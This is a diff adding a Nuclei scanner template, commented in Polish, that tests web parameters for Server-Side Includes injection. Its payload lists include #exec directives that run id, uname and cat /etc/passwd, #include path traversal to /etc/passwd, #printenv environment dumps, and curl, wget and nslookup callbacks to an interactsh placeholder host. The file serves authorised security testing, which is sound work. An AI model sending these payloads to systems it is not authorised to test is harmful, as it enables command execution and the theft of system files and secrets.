@@ -1,0 +1,238 @@
+# ============================================================================
+# WSTG-INPV-08: Server-Side Includes (SSI) Injection (Universal)
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`
+#   dla wykrywania blind variants tej kategorii (SSI). Pierwszy http
+#   block (direct echo / error) bez zmian. Idiomatyczny pattern z dast/
+#   vulnerabilities/{ssrf,xxe,cmdi}/blind-*.yaml. Bez tego matchera callback
+#   do interactsh dochodził, ale Nuclei nie raportował findingu.
+#
+# Pre-poprawkowe spełnienie 6 kryteriów: ✓ Coverage Matrix, ✓ Multi-warstwowe
+# matchery (matchers-condition: and z primary + anti-FP), ✓ Source comments
+# per GROUP, ✓ Safety nets (pre-condition z destructive blocklist, statyki,
+# OPTIONS/HEAD/DELETE skip), ✓ Sweet spot payloadów, ✓ Component fuzzing 5/5.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ <!--#exec cmd= -->
+#   ✓ <!--#include virtual= / file= -->
+#   ✓ <!--#config -->
+#   ✓ <!--#echo var= -->
+#   ✓ <!--#printenv -->
+#   ✓ Encoding bypass (URL-encoded SSI directives)
+#
+# Performance budget: low (~50 payloads)
+# Estimated time: ~3-5 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/Server Side Include Injection/*
+#   2. hacktricks/.../server-side-inclusion-edge-side-inclusion-injection.md
+# ============================================================================
+
+id: wstg-inpv-08-ssi-injection
+
+info:
+  name: "WSTG-INPV-08: Server-Side Includes (SSI) Injection (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa SSI injection w aplikacjach z włączonym mod_include lub podobną
+    funkcjonalnością. SSI directives (#exec, #include, #echo, #printenv)
+    wstrzykiwane do wartości parametrów - jeśli serwer je interpretuje,
+    canary lub command output pojawia się w odpowiedzi.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection
+  classification:
+    cwe-id: CWE-94,CWE-97
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: dast,wstg,wstg-v42-inpv-08,ssi-injection,asvs-v5.2.5,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: #exec cmd=
+        # ====================================================================
+        - "<!--#exec cmd=\"echo {{canary}}\" -->"
+        - "<!--#exec cmd=\"id\" -->"
+        - "<!--#exec cmd=\"uname -a\" -->"
+        - "<!--#exec cmd=\"whoami\" -->"
+        - "<!--#exec cmd=\"pwd\" -->"
+        - "<!--#exec cmd=\"ls\" -->"
+        - "<!--#exec cmd=\"cat /etc/passwd\" -->"
+        - "<!--#exec cmd=\"dir\" -->"
+        - "<!--#exec cmd=\"echo {{canary}};id\" -->"
+        # OOB
+        - "<!--#exec cmd=\"curl http://{{interactsh-url}}/{{canary}}\" -->"
+        - "<!--#exec cmd=\"nslookup {{interactsh-url}}\" -->"
+        - "<!--#exec cmd=\"wget http://{{interactsh-url}}/{{canary}}\" -->"
+
+        # ====================================================================
+        # GROUP 2: #include
+        # ====================================================================
+        - "<!--#include virtual=\"/etc/passwd\" -->"
+        - "<!--#include file=\"/etc/passwd\" -->"
+        - "<!--#include virtual=\"index.html\" -->"
+        - "<!--#include virtual=\"/index.html\" -->"
+        - "<!--#include file=\"../../../../etc/passwd\" -->"
+        - "<!--#include virtual=\"../../../etc/passwd\" -->"
+
+        # ====================================================================
+        # GROUP 3: #echo var=
+        # ====================================================================
+        - "<!--#echo var=\"DATE_LOCAL\" -->"
+        - "<!--#echo var=\"DOCUMENT_NAME\" -->"
+        - "<!--#echo var=\"DOCUMENT_URI\" -->"
+        - "<!--#echo var=\"REMOTE_ADDR\" -->"
+        - "<!--#echo var=\"SERVER_SOFTWARE\" -->"
+        - "<!--#echo var=\"HTTP_USER_AGENT\" -->"
+        - "<!--#echo var=\"PATH_INFO\" -->"
+
+        # ====================================================================
+        # GROUP 4: #printenv (dump all env vars - jackpot)
+        # ====================================================================
+        - "<!--#printenv -->"
+
+        # ====================================================================
+        # GROUP 5: #config (changes settings - some servers reflect)
+        # ====================================================================
+        - "<!--#config errmsg=\"{{canary}}\" -->"
+        - "<!--#config timefmt=\"{{canary}}\" -->"
+        - "<!--#config sizefmt=\"bytes\" --><!--#fsize file=\"index.html\" -->"
+
+        # ====================================================================
+        # GROUP 6: #set + #echo (variable assignment)
+        # ====================================================================
+        - "<!--#set var=\"x\" value=\"{{canary}}\" --><!--#echo var=\"x\" -->"
+
+        # ====================================================================
+        # GROUP 7: URL-encoded variants
+        # ====================================================================
+        - "%3C%21--%23exec%20cmd%3D%22echo%20{{canary}}%22%20--%3E"
+        - "%3C%21--%23include%20virtual%3D%22%2Fetc%2Fpasswd%22%20--%3E"
+        - "%3C%21--%23printenv%20--%3E"
+        - "%3C%21--%23echo%20var%3D%22DOCUMENT_NAME%22%20--%3E"
+
+        # ====================================================================
+        # GROUP 8: Spacing variants (mod_include lenient parsing)
+        # ====================================================================
+        - "<!--#exec cmd='echo {{canary}}'-->"
+        - "<!--    #exec cmd=\"echo {{canary}}\"    -->"
+        - "<!--#exec\tcmd=\"echo {{canary}}\"-->"
+        - "<!--#EXEC cmd=\"echo {{canary}}\" -->"     # case variant
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - canary echoed back (SSI exec confirmed) lub typowe
+      # markery w odpowiedzi (id output, env dump, /etc/passwd content)
+      - type: regex
+        part: body
+        name: ssi-evidence
+        regex:
+          - "{{canary}}"                              # canary z #exec echo
+          - "uid=\\d+\\("                             # id output
+          - "(?:bin|nobody|sshd|www-data):[x*]:\\d+:" # /etc/passwd via #include
+          - "Linux version \\d+\\.\\d+"               # uname output
+          - "(?i)apache|nginx|iis|lighttpd"           # SERVER_SOFTWARE
+          # printenv markers
+          - "DOCUMENT_ROOT=/"
+          - "SERVER_SOFTWARE="
+          - "REMOTE_ADDR=\\d+\\.\\d+\\.\\d+\\.\\d+"
+        condition: or
+
+      # Warstwa 2: SECONDARY - body nie zawiera RAW SSI directive (znaczy że
+      # serwer go zinterpretował, nie po prostu odbił).
+      # Jeśli odpowiedź zawiera literalnie "<!--#exec" to znaczy że NIE jest
+      # to SSI - to plain reflection, więc negative match
+      - type: regex
+        part: body
+        name: ssi-was-interpreted
+        negative: true
+        regex:
+          - "(?i)<!--#(exec|include|echo|printenv|config|set)"
+
+      # Warstwa 3: ANTI-FP
+      - type: dsl
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      - type: dsl
+        dsl:
+          - "duration < 30"
+
+  # ==========================================================================
+  # DRUGI BLOCK: Blind SSI via OOB
+  # Wykrywa SSI gdy body nie zwraca rendered output (np. directive jest
+  # wykonywana ale wyjście nie wraca do klienta - np. zapisywane do logu).
+  # Callback do interactsh = mod_include zinterpretował dyrektywę.
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      ssi_oob:
+        - "<!--#exec cmd=\"curl http://{{interactsh-url}}/{{canary}}\" -->"
+        - "<!--#exec cmd=\"nslookup {{interactsh-url}}\" -->"
+        - "<!--#exec cmd=\"wget http://{{interactsh-url}}/{{canary}}\" -->"
+        - "<!--#include virtual=\"http://{{interactsh-url}}/{{canary}}\" -->"
+        - "<!--#include file=\"http://{{interactsh-url}}/{{canary}}\" -->"
+
+    fuzzing:
+      - parts: [query, body, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{url_encode(ssi_oob)}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Większość nowoczesnych serwerów ma SSI wyłączone domyślnie (Apache mod_include
+#   nie jest standardowo aktywne) - real-world hit rate niski
+# - Aplikacje z escape filtrem na <!-- #--> generują FN
+# ============================================================================
